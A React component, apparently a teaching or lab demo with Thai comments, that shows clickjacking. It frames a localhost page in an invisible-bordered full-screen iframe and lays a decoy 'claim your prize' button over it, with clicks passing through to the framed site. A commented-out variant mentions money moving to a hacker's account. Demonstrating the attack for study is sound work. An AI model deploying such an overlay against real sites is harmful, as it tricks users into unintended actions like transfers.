import React, { useEffect } from 'react';

const ClickjackingExample = () => {

  useEffect(() => {
    // โค้ดนี้จะทำการแอบฝัง iframe และปุ่มที่ต้องการให้ผู้ใช้คลิก
    const iframe = document.createElement("iframe");
    
    iframe.src = "http://localhost:5173/protext-clickjacking"; // เว็บไซต์ที่โจมตี
    iframe.style.width = "100%";
    iframe.style.height = "100%";
    iframe.style.position = "absolute";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.zIndex = "1";  // ทำให้ iframe ครอบคลุมส่วนอื่นของหน้าจอ
    // ไม่ตั้ง opacity ที่นี่ เพราะต้องการให้ iframe สามารถแสดงผลได้
    iframe.style.border = "none"; // เอาขอบ iframe ออก


    iframe.style.opacity = "1";


    // // ปุ่มปลอมที่ผู้ใช้จะคลิก
    // const fakeButton = document.createElement("button");
    // fakeButton.innerHTML = "คลิกรับรางวัล!";
    // fakeButton.style.position = "absolute";
    // fakeButton.style.top = "87%";
    // fakeButton.style.left = "56%";
    // fakeButton.style.transform = "translate(-50%, -50%)";
    // fakeButton.style.zIndex = "2";  // ทำให้ปุ่มแสดงขึ้นมาเหนือ iframe

    // document.body.appendChild(iframe);
    // document.body.appendChild(fakeButton);

    // fakeButton.addEventListener("click", () => {
    //   alert("คุณได้โอนเงินไปที่บัญชีของแฮ็กเกอร์!");
    // });

    const fakeButton = document.createElement("button");
    fakeButton.innerHTML = "คลิกเพื่อรับรางวัล!";
    fakeButton.style.width = "190px";
    fakeButton.style.height = "50px";
    fakeButton.style.position = "absolute";
    fakeButton.style.top = "88%";
    fakeButton.style.left = "55%";
    fakeButton.style.transform = "translate(-50%, -50%)";
    fakeButton.style.zIndex = "2";
    fakeButton.style.opacity = "1";
    fakeButton.style.pointerEvents = "none"; // ให้คลิกทะลุไป iframe ด้านหลัง

    document.body.appendChild(iframe);
    document.body.appendChild(fakeButton);

    // ออกจาก page ให้ clear iframe และปุ่ม
    return () => {
      document.body.removeChild(iframe);
      document.body.removeChild(fakeButton);
    };
  }, []);





  return (
    <div>
   
      <h1>ตัวอย่าง Clickjacking ใน React</h1>
      <p>คลิกปุ่มด้านล่างเพื่อรับรางวัล!</p>
    </div>
  );
}

export default ClickjackingExample;
